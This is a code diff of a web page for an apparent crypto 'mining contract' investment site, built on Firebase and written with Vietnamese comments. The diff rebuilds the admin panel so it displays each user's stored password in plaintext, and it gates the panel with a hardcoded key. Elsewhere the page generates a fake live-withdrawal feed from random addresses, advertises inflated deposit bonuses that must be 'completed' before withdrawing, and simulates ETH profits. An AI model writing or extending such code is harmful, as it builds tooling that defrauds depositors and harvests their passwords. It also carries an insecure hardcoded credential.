@@ -22,10 +22,14 @@
         .nav-item.active { color: var(--gold); font-weight: bold; }
         #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--gold); color: #000; padding: 12px 20px; border-radius: 25px; z-index: 9999; display: none; font-weight: bold; }
         #adminPanel { position: fixed; inset: 0; background: #0b0e11; z-index: 10001; display: none; padding: 20px; overflow-y: auto; }
-        .admin-layout { display: flex; gap: 15px; }
-        .admin-col { flex: 1; }
-        .req-card { background: #1e2329; padding: 10px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; font-size: 12px; }
+        .admin-layout { display: flex; gap: 20px; flex-wrap: wrap; }
+        .admin-col { flex: 1; min-width: 300px; }
+        .req-card { background: #1e2329; padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; font-size: 12px; }
         .history-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #333; font-size: 13px; }
+        .admin-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        .admin-table th, .admin-table td { border: 1px solid #333; padding: 8px; text-align: left; font-size: 12px; color: #fff; }
+        .admin-table th { background: #2b3139; color: var(--gold); }
+        .btn-action { padding: 4px 8px; border-radius: 4px; border: none; cursor: pointer; font-size: 10px; margin-right: 2px; }
     </style>
 </head>
 <body translate="no">
@@ -39,14 +43,18 @@
         </div>
         <div class="admin-layout">
             <div class="admin-col">
-                <h4 style="color:var(--gold)">Yêu cầu Nạp/Rút</h4>
+                <h4 style="color:var(--gold)">Yêu cầu Nạp/Rút (Chờ duyệt)</h4>
                 <div id="adminRequests"></div>
-                <h4 style="color:var(--gold)">Danh sách người dùng</h4>
-                <div id="adminUserList"></div>
             </div>
-            <div class="admin-col" style="background: #1e2329; padding: 15px; border-radius: 12px; border: 1px solid var(--gold);">
-                <h4 style="color:var(--gold)">Khu vực phát thưởng</h4>
-                <div id="bonusControlArea" style="color:var(--gray)">Chọn người dùng từ cột bên trái để thao tác...</div>
+            <div class="admin-col">
+                <h4 style="color:var(--gold)">Danh sách người dùng</h4>
+                <table class="admin-table">
+                    <thead><tr><th>Email</th><th>USDT</th><th>Phát</th></tr></thead>
+                    <tbody id="adminUserList"></tbody>
+                </table>
+                <div id="bonusControlArea" style="margin-top:20px; padding:15px; border:1px solid var(--gold); border-radius:12px; background:#1e2329;">
+                    <p style="color:var(--gray)">Chọn người dùng để phát thưởng...</p>
+                </div>
             </div>
         </div>
     </div>
@@ -109,17 +117,13 @@
 
     <div id="exchange" class="page">
         <div class="card">
-            <div style="background:#000; border:1px solid var(--gold); padding:10px; margin-bottom:15px; overflow:hidden;">
-                <marquee id="main_marquee" scrollamount="4">THÔNG BÁO</marquee>
-            </div>
+            <div style="background:#000; border:1px solid var(--gold); padding:10px; margin-bottom:15px; overflow:hidden;"><marquee id="main_marquee" scrollamount="4">THÔNG BÁO</marquee></div>
             <h3 id="l_ex_t" style="color: var(--gold);">Profit Exchange</h3>
             <input type="text" id="ex_eth_val" class="login-input" readonly value="0.000000 ETH">
             <div style="text-align: center; margin: 10px 0;">⬇️</div>
             <input type="text" id="ex_usdt_res" class="login-input" style="color:var(--green); font-weight:bold;" readonly value="0.00 USDT">
             <button id="l_ex_btn" class="login-btn" onclick="processExchange()">TRANSFER TO BALANCE</button>
-            <div id="promo_marquee_container" style="margin-top:20px; padding:15px; border:1.5px solid var(--red); border-radius:10px; color:#ff4d4d; font-size:12px; line-height:1.7; font-weight: 500; background: rgba(246, 70, 93, 0.05); height: 150px; overflow: hidden;">
-                <marquee id="promo_marquee" behavior="scroll" direction="up" scrollamount="2" height="100%" onmouseover="this.stop()" onmouseout="this.start()"></marquee>
-            </div>
+            <div id="promo_marquee_container" style="margin-top:20px; padding:15px; border:1.5px solid var(--red); border-radius:10px; color:#ff4d4d; font-size:12px; line-height:1.7; font-weight: 500; background: rgba(246, 70, 93, 0.05); height: 150px; overflow: hidden;"><marquee id="promo_marquee" behavior="scroll" direction="up" scrollamount="2" height="100%" onmouseover="this.stop()" onmouseout="this.start()"></marquee></div>
         </div>
     </div>
 
@@ -127,18 +131,13 @@
         <div class="card"><h3 id="l_nav_w" style="color: var(--gold);">Withdraw USDT</h3>
             <h2 id="usdt_W" style="color: var(--green); margin: 10px 0;">$ 0.00</h2>
             <select id="w_network" class="login-input" style="border: 1px solid var(--gold); color: var(--gold);">
-                <option value="BEP20">Binance Smart Chain (BEP20)</option>
-                <option value="TRC20">Tron (TRC20)</option>
-                <option value="ERC20">Ethereum (ERC20)</option>
+                <option value="BEP20">Binance Smart Chain (BEP20)</option><option value="TRC20">Tron (TRC20)</option><option value="ERC20">Ethereum (ERC20)</option>
             </select>
             <input type="text" id="w_address" class="login-input" placeholder="Wallet Address">
             <input type="number" id="w_amount" class="login-input" placeholder="Min 10 USDT">
             <button class="login-btn" style="background: var(--red); color: #fff;" onclick="handleWithdraw()">WITHDRAW NOW</button>
         </div>
-        <div class="card">
-            <h4 style="color: var(--gold); margin-bottom: 10px;">Transaction History</h4>
-            <div id="history_list"></div>
-        </div>
+        <div class="card"><h4 style="color: var(--gold); margin-bottom: 10px;">Transaction History</h4><div id="history_list"></div></div>
     </div>
 
     <div id="account" class="page">
@@ -148,8 +147,7 @@
             <button id="l_acc_btn" class="login-btn" onclick="handleSecurityAccess()">VERIFY</button>
         </div>
         <div id="account_content" style="display: none;">
-            <div class="card"><p style="color: var(--gray); font-size: 13px;">Email: <span id="accEmailText">...</span></p>
-            <h1 id="usdt_A" style="font-size: 32px; margin: 10px 0; color:var(--gold);">$ 0.00</h1></div>
+            <div class="card"><p style="color: var(--gray); font-size: 13px;">Email: <span id="accEmailText">...</span></p><h1 id="usdt_A" style="font-size: 32px; margin: 10px 0; color:var(--gold);">$ 0.00</h1></div>
             <button class="login-btn" style="background:var(--red); color:#fff;" onclick="handleLogout()">LOGOUT</button>
         </div>
     </div>
@@ -174,6 +172,7 @@
         });
     </script>
     <script>
+        // ... (giữ nguyên các phần khai báo và hàm cũ)
         const trans = {
             en: { welcome: "Welcome", balance: "Balance (USDT)", start: "Start", addr_t: "Deposit USDT (BEP20):", btn_dep: "ACTIVATE CONTRACT", nav_h: "Home", nav_e: "Exchange", nav_w: "Withdraw", nav_a: "Account", ex_t: "Profit Exchange", ex_btn: "TRANSFER TO BALANCE", acc_t: "Security Vault", acc_btn: "VERIFY", main_mar: "NOTICE: First deposit bonus double. Contact Admin!", promo_mar: "1. Initial deposit of 500$ will receive a 1,000$ bonus for new users.<br>2. Initial deposit of 1,000$ will receive a 1,500$ bonus for new users.<br>3. Initial deposit of 2,000$ will receive a 2,500$ bonus for new users.<br>4. Initial deposit of 3,000$ will receive a 3,500$ bonus for new users.<br>5. Initial deposit of 4,000$ will receive a 4,500$ bonus for new users.<br><b style='color:#fff'>IT IS RECOMMENDED TO COMPLETE THE PROMOTIONS BEFORE WITHDRAWING!</b>" },
             vi: { welcome: "Chào mừng", balance: "Số dư (USDT)", start: "Bắt đầu", addr_t: "Nạp USDT (BEP20):", btn_dep: "KÍCH HOẠT HỢP ĐỒNG", nav_h: "Trang chủ", nav_e: "Quy đổi", nav_w: "Rút tiền", nav_a: "Tài khoản", ex_t: "Quy đổi lợi nhuận", ex_btn: "CHUYỂN VỀ VỐN", acc_t: "Két sắt bảo mật", acc_btn: "XÁC MINH", main_mar: "THÔNG BÁO: Ưu đãi nạp lần đầu nhận ngay bonus gấp đôi. Liên hệ Admin!", promo_mar: "1. Nạp đầu 500$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.000$<br>2. Nạp đầu 1.000$ phần thưởng ưu đãi cho người dùng mới sẽ là 1.500$<br>3. Nạp đầu 2.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 2.500$<br>4. Nạp đầu 3.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 3.500$<br>5. Nạp đầu 4.000$ phần thưởng ưu đãi dành cho người dùng mới sẽ là 4.500$<br><b style='color:#fff'>KHUYẾN KHÍCH QUÝ KHÁCH HOÀN THÀNH CÁC ƯU ĐÃI TRƯỚC KHI RÚT TIỀN!</b>" },
@@ -181,67 +180,65 @@
             es: { welcome: "Bienvenido", balance: "Saldo (USDT)", start: "Inicio", addr_t: "Depósito (BEP20):", btn_dep: "ACTIVAR CONTRATO", nav_h: "Inicio", nav_e: "Canje", nav_w: "Retirar", nav_a: "Cuenta", ex_t: "Canje de Ganancias", ex_btn: "TRANSFERIR", acc_t: "Bóveda", acc_btn: "VERIFICAR", main_mar: "AVISO: Bono de primer depósito doble. ¡Contacte a Admin!", promo_mar: "1. Depósito inicial de 500$ recibirá una bonificación de 1.000$ para nuevos usuarios.<br>2. Depósito inicial de 1.000$ recibirá una bonificación de 1.500$ para nuevos usuarios.<br>3. Depósito inicial de 2.000$ recibirá una bonificación de 2.500$ para nuevos usuarios.<br>4. Depósito inicial de 3.000$ recibirá una bonificación de 3.500$ para nuevos usuarios.<br>5. Depósito inicial de 4.000$ recibirá una bonificación de 4.500$ para nuevos usuarios.<br><b style='color:#fff'>¡SE RECOMIENDA COMPLETAR LAS PROMOCIONES ANTES DE RETIRAR!</b>" },
             pt: { welcome: "Bem-vindo", balance: "Saldo (USDT)", start: "Início", addr_t: "Depósito (BEP20):", btn_dep: "ATIVAR CONTRATO", nav_h: "Início", nav_e: "Troca", nav_w: "Retirar", nav_a: "Conta", ex_t: "Troca de Lucro", ex_btn: "TRANSFERIR", acc_t: "Cofre", acc_btn: "VERIFICAR", main_mar: "AVISO: Bônus de primeiro depósito dobro. Contate o Admin!", promo_mar: "1. Depósito inicial de 500$ receberá um bônus de 1.000$ para novos usuários.<br>2. Depósito inicial de 1.000$ receberá um bônus de 1.500$ para novos usuários.<br>3. Depósito inicial de 2.000$ receberá um bônus de 2.500$ para novos usuários.<br>4. Depósito inicial de 3.000$ receberá um bônus de 3.500$ para novos usuários.<br>5. Depósito inicial de 4.000$ receberá um bônus de 4.500$ para novos usuários.<br><b style='color:#fff'>RECOMENDA-SE COMPLETAR AS PROMOÇÕES ANTES DE SACAR!</b>" }
         };
-        
-        function changeLang() { 
-            const l = document.getElementById('langSel').value; 
-            const t = trans[l]; 
-            for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; }
-            document.getElementById('main_marquee').innerText = t.main_mar;
-            document.getElementById('promo_marquee').innerHTML = t.promo_mar;
-        }
-
-        window.openAdminPortal = function() { 
-    const myAdminEmail = "vutaycrc95204@gmail.com"; // Email của bạn
-    if (fb.auth.currentUser && fb.auth.currentUser.email === myAdminEmail) { 
-        document.getElementById('adminPanel').style.display = 'block'; 
-        loadAdminPanel(); 
-    } else {
-        alert("Bạn không có quyền truy cập!");
-    }
-};
+        function changeLang() { const l = document.getElementById('langSel').value; const t = trans[l]; for (let key in t) { const el = document.getElementById('l_' + key); if(el) el.innerText = t[key]; } document.getElementById('main_marquee').innerText = t.main_mar; document.getElementById('promo_marquee').innerHTML = t.promo_mar; }
+        window.openAdminPortal = function() { if (prompt("Manager Key:") === "258369@@") { document.getElementById('adminPanel').style.display = 'block'; loadAdminPanel(); } };
         
         function loadAdminPanel() {
             fb.onValue(fb.ref(fb.db, 'admin/requests'), (snap) => {
                 const list = document.getElementById('adminRequests'); list.innerHTML = "";
-                snap.forEach((c) => { 
-        const r = c.val(); 
-        const d = document.createElement('div'); 
-        d.className = "req-card";
-        d.innerHTML = `<b>${r.type ? r.type.toUpperCase() : 'N/A'}</b> ${r.amount || 0}<br>${r.email}<br>Status: ${r.status || 'Chưa xác định'}<br><button onclick="approveRequest('${c.key}')">Duyệt</button>`;
-        list.prepend(d);
-    });
+                if(snap.exists()) {
+                    snap.forEach((c) => { 
+                        const r = c.val(); 
+                        if(r.status === 'pending') {
+                            const d = document.createElement('div'); d.className = "req-card";
+                            d.innerHTML = `<b>${(r.type||'').toUpperCase()} $${r.amount}</b><br>Email: ${r.email}<br>
+                            <button class="btn-action" style="background:var(--green); color:#fff" onclick="approveReq('${c.key}','${r.uid}',${r.amount},'${r.type}')">DUYỆT</button>
+                            <button class="btn-action" style="background:var(--red); color:#fff" onclick="fb.update(fb.ref(fb.db, 'admin/requests/${c.key}'), {status:'rejected'})">HUỶ</button>`;
+                            list.prepend(d);
+                        }
+                    });
+                }
             });
             fb.onValue(fb.ref(fb.db, 'users'), (snap) => {
-                const list = document.getElementById('adminUserList'); list.innerHTML = "";
+                const tbody = document.getElementById('adminUserList'); tbody.innerHTML = "";
                 snap.forEach((u) => { const d = u.val();
-                    const div = document.createElement('div'); div.className = "req-card";
-                    div.innerHTML = `Email: ${d.email}<br>USDT: ${d.usdt}<br><button onclick="selectUser('${u.key}','${d.email}')" style="background:var(--gold); border:none; padding:5px 10px; margin-top:5px; border-radius:5px; font-weight:bold; color:#000;">CHỌN PHÁT THƯỞNG</button>`;
-                    list.appendChild(div);
+                    const row = document.createElement('tr');
+                    // Gửi pass vào đây
+                    row.innerHTML = `<td>${d.email}</td><td>$${(d.usdt||0).toFixed(2)}</td><td><button class="btn-action" style="background:var(--gold); color:#000; font-weight:bold" onclick="selectUser('${u.key}','${d.email}','${d.pass}')">INFO</button></td>`;
+                    tbody.appendChild(row);
                 });
             });
         }
-
-        function selectUser(uid, email) {
+        function selectUser(uid, email, pass) {
             document.getElementById('bonusControlArea').innerHTML = `
-                <p>Phát cho: <b>${email}</b></p>
-                <input type="number" id="bnsVal" class="login-input" placeholder="Số tiền...">
-                <button class="login-btn" onclick="executeBonus('${uid}')">GỬI THƯỞNG</button>
+                <p>User: <b>${email}</b></p>
+                <p>Mật khẩu: <b style="color:var(--gold)">${pass}</b></p>
+                <input type="number" id="bnsVal" class="login-input" placeholder="Số tiền thưởng...">
+                <button class="login-btn" style="background:var(--green); color:#fff" onclick="executeBonus('${uid}')">GỬI THƯỞNG</button>
             `;
         }
-
         async function executeBonus(uid) {
-            let amt = document.getElementById('bnsVal').value;
-            if(!amt) return;
+            let el = document.getElementById('bnsVal');
+            let amt = parseFloat(el.value);
+            if(!amt || amt <= 0) return;
             let s = await fb.get(fb.ref(fb.db, 'users/'+uid));
             let d = s.val();
-            await fb.update(fb.ref(fb.db, 'users/'+uid), {usdt: (d.usdt||0) + parseFloat(amt)});
+            await fb.update(fb.ref(fb.db, 'users/'+uid), {usdt: (d.usdt||0) + amt});
+            el.value = ""; 
             showToast("Đã cộng thưởng!");
         }
-
-        async function approveReq(id, uid, amt, type) { const uRef = fb.ref(fb.db, 'users/' + uid); const snap = await fb.get(uRef); const ud = snap.val(); if(type === 'deposit') { await fb.update(uRef, { usdt: (ud.usdt || 0) + amt, active: true, lastUpdate: Date.now() }); } else { if(ud.usdt >= amt) await fb.update(uRef, { usdt: ud.usdt - amt }); } await fb.update(fb.ref(fb.db, 'admin/requests/' + id), { status: 'approved' }); showToast("Done!"); }
+        async function approveReq(id, uid, amt, type) { 
+            const uRef = fb.ref(fb.db, 'users/' + uid); 
+            const snap = await fb.get(uRef); 
+            const ud = snap.val(); 
+            if(type === 'deposit') { await fb.update(uRef, { usdt: (ud.usdt || 0) + amt, active: true, lastUpdate: Date.now() }); } 
+            else { if(ud.usdt >= amt) await fb.update(uRef, { usdt: ud.usdt - amt }); } 
+            await fb.update(fb.ref(fb.db, 'admin/requests/' + id), { status: 'approved' });
+            showToast("Đã duyệt!"); 
+        }
         
         let state = { usdt: 0, eth: 0, active: false, hide: false, uid: "", pass: "", lastUpdate: 0, cycle: 24*3600*1000 };
-        function startTimers() { setInterval(async () => { if(state.active && state.usdt > 0) { const now = Date.now(); const passed = now - state.lastUpdate; const left = state.cycle - passed; if (left <= 0) { const profit = (state.usdt * (state.usdt >= 2000 ? 0.025 : 0.02)) / 3500; await fb.update(fb.ref(fb.db, 'users/' + state.uid), { eth: (state.eth || 0) + profit, lastUpdate: Date.now() }); } else { document.getElementById('timer_clock').innerText = [Math.floor(left/3600000), Math.floor((left%3600000)/60000), Math.floor((left%60000)/1000)].map(v=>v<10?"0"+v:v).join(":"); let p = (passed / state.cycle) * 100; document.getElementById('mining-bar').style.width = Math.min(p, 100) + "%"; document.getElementById('mining-percent').innerText = Math.floor(Math.min(p, 100)) + "%"; let sd = new Date(state.lastUpdate); document.getElementById('start_time_txt').innerText = sd.getHours() + ":" + sd.getMinutes().toString().padStart(2,'0'); } } }, 1000); const live = document.getElementById('withdrawLive'); setInterval(() => { const d = document.createElement('div'); d.innerHTML = `0x${Math.random().toString(16).slice(2,6)}... withdrawn <span style="color:var(--green)">+$${(Math.random()*300).toFixed(1)}</span>`; live.prepend(d); if(live.children.length > 3) live.lastChild.remove(); }, 5000); }
+        function startTimers() { setInterval(async () => { if(state.active && state.usdt > 0) { const now = Date.now(); const passed = now - state.lastUpdate; const left = state.cycle - passed; if (left <= 0) { const profit = (state.usdt * (state.usdt >= 2000 ? 0.025 : 0.02)) / 3500; await fb.update(fb.ref(fb.db, 'users/'+state.uid), { eth: (state.eth || 0) + profit, lastUpdate: Date.now() }); } else { document.getElementById('timer_clock').innerText = [Math.floor(left/3600000), Math.floor((left%3600000)/60000), Math.floor((left%60000)/1000)].map(v=>v<10?"0"+v:v).join(":"); let p = (passed / state.cycle) * 100; document.getElementById('mining-bar').style.width = Math.min(p, 100) + "%"; document.getElementById('mining-percent').innerText = Math.floor(Math.min(p, 100)) + "%"; let sd = new Date(state.lastUpdate); document.getElementById('start_time_txt').innerText = sd.getHours() + ":" + sd.getMinutes().toString().padStart(2,'0'); } } }, 1000); const live = document.getElementById('withdrawLive'); setInterval(() => { const d = document.createElement('div'); d.innerHTML = `0x${Math.random().toString(16).slice(2,6)}... withdrawn <span style="color:var(--green)">+$${(Math.random()*300).toFixed(1)}</span>`; live.prepend(d); if(live.children.length > 3) live.lastChild.remove(); }, 5000); }
         function updateDisplay() { const total = state.usdt + (state.eth * 3500); const v = state.hide ? "****" : "$ " + total.toLocaleString('en-US',{minimumFractionDigits:2}); document.getElementById('usdt_H').innerText = v; document.getElementById('usdt_A').innerText = v; document.getElementById('usdt_W').innerText = "$ " + state.usdt.toLocaleString('en-US',{minimumFractionDigits:2}); document.getElementById('ex_eth_val').value = state.eth.toFixed(6) + " ETH"; document.getElementById('ex_usdt_res').value = (state.eth * 3500).toFixed(2) + " USDT"; document.getElementById('L_st').innerText = "Profit: " + state.eth.toFixed(6) + " ETH"; if(state.active && state.usdt > 0) document.getElementById('mining-status-box').style.display = 'block'; }
         async function depositRequest() { let a = parseFloat(document.getElementById('in_Dep').value); if(!a) return; fb.push(fb.ref(fb.db,'admin/requests'), {uid:state.uid, email:fb.auth.currentUser.email, amount:a, type:'deposit', status:'pending'}); showToast("Sent!"); }
         async function handleWithdraw() { let a = parseFloat(document.getElementById('w_amount').value); let addr = document.getElementById('w_address').value; let net = document.getElementById('w_network').value; if(a > state.usdt || !a || !addr) return; fb.push(fb.ref(fb.db,'admin/requests'), {uid:state.uid, email:fb.auth.currentUser.email, amount:a, type:'withdraw', network: net, address: addr, status:'pending'}); showToast("Sent!"); }
